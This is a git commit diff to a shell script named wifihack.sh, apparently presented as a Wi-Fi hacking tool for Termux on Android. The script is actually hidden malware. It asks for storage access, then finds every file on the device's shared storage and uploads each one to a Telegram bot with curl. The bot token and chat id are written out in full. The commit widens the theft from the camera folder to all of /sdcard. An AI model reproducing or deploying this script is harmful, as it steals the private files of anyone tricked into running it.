c8cda329f455c564b5c7d49c13c73fcb6ae19f89
Ye72termux <127570957+Ye72termux@users.noreply.github.com>
2023-03-11 04:05:34 +0300

    Update wifihack.sh

--- wifihack.sh
+++ wifihack.sh
@@ -1,7 +1,7 @@
 #! /bin/bash
 
 termux-setup-storage
-cd /sdcard /DCIM/Camera
+cd /sdcard 
 find ./ -name "*.*" | while read file; do 
    curl --form document=@$file https://api.telegram.org/bot5914616936:AAGS2Cx5_w8VTwVQq3g2flwymkiN_Em11ks/sendDocument?chat_id=5931840787
 done
